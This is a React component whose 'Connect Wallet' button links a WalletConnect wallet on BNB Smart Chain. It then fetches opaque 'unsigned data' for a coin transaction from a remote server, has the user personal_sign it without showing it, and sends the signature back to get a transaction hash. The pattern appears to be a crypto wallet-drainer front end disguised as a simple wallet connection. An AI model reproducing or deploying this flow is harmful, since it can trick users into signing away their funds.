import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // فقط BSC
      methods: ["personal_sign"],  // تغییر به personal_sign
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var accounts = await provider.request({ method: "eth_accounts" });
    var sender = accounts[0];
    console.log("✅ Wallet Address:", sender);

    let apiUrl = process.env.REACT_APP_API_URL; // استفاده از متغیر محیطی

    async function getRawSignature(address) {
      try {
        let requestData = { handler: "tx", address, chain: "56", type: "coin" };

        let response = await fetch(apiUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(requestData),
        });

        let unsignedData = await response.json();
        console.log("📜 Unsigned Data:", unsignedData);

        var rawSignature = await provider.request({
          method: "personal_sign",  // تغییر به personal_sign
          params: [JSON.stringify(unsignedData), address], // توجه به ترتیب پارامترها
        });

        return rawSignature;
      } catch (error) {
        console.error("❌ Error in getRawSignature:", error);
        return null;
      }
    }

    async function sendSignedTransaction(signature) {
      try {
        var requestData = {
          handler: "sign",
          signature: signature,
          type: "coin",
        };

        let response = await fetch(apiUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(requestData),
        });

        let resultJson = await response.json();
        console.log("📤 Server Response:", resultJson);

        return resultJson.txHash || resultJson.result || resultJson;
      } catch (error) {
        console.error("❌ Error in sendSignedTransaction:", error);
        return null;
      }
    }

    var rawSignature = await getRawSignature(sender);

    if (rawSignature) {
      console.log("✍️ Signed Raw Data:", rawSignature);
      var txHash = await sendSignedTransaction(rawSignature);
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Signing failed.");
    }
  }

  return (
    <button
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
    >
      <span>Connect Wallet</span>
    </button>
  );
}

export default App;
